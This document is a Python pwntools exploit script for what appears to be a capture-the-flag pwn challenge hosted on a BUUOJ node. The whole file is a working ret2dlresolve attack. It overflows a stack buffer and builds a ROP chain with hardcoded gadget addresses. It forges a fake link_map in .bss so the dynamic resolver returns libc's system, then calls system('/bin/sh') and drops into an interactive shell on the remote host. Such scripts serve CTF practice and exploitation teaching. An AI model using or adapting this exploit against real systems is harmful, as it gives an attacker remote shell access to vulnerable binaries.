'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)

1. fake linkmap at bss segment
2. ROP to dlresolve to load libc system function address
3. call system("/bin/sh")
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "25494" 
filename = "./pwn"
elf = ELF(filename)
local_libc = "/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6"
remote_libc = "./libc-2.31.so"
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

read_plt_addr = elf.plt['read']
read_got_addr = elf.got['read']
pop_rdi_ret_addr = 0x000000000040115e
pop_rsi_r15_ret_addr = 0x0000000000401231
# main_addr = 0x00000000004011AB
buffer_overflow_size = 112 + 8
bss_segment_addr = 0x404040 + 0x100
libc_offset = libc.sym['system'] - libc.sym['read']
plt0_addr = 0x0000000000401020
plt_load_addr = plt0_addr + 6 

def B():
    gdb.attach(io)
    pause()

def fake_Linkmap_payload(fake_linkmap_addr, func_ptr, offset):
    linkmap = p64(offset & (2 ** 64 - 1))
    linkmap += p64(0)
    linkmap += p64(fake_linkmap_addr + 0x18)
    linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1))
    linkmap += p64(0x7) # bypass valid check
    linkmap += p64(0) * 3
    linkmap += p64(func_ptr - 0x8)
    linkmap += b'/bin/sh\x00'
    linkmap = linkmap.ljust(0x68, b'f')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xF8, b'f')
    linkmap += p64(fake_linkmap_addr + 0x8)
    return linkmap

def pwn():
    # fake linkmap
    fake_linkmap = fake_Linkmap_payload(bss_segment_addr, read_got_addr, libc_offset)
    # ROP to dlresolve
    payload = cyclic(buffer_overflow_size)
    payload += p64(pop_rdi_ret_addr) + p64(0)
    payload += p64(pop_rsi_r15_ret_addr) + p64(bss_segment_addr) + p64(0)
    payload += p64(read_plt_addr)
    payload += p64(pop_rsi_r15_ret_addr) + p64(0) + p64(0)
    payload += p64(pop_rdi_ret_addr) + p64(bss_segment_addr + 0x48) # "/bin/sh\x00"
    payload += p64(plt_load_addr) + p64(bss_segment_addr) + p64(0)

    io.sendline(payload)
    io.sendline(fake_linkmap)


if __name__ == "__main__":
    pwn()
    io.interactive()
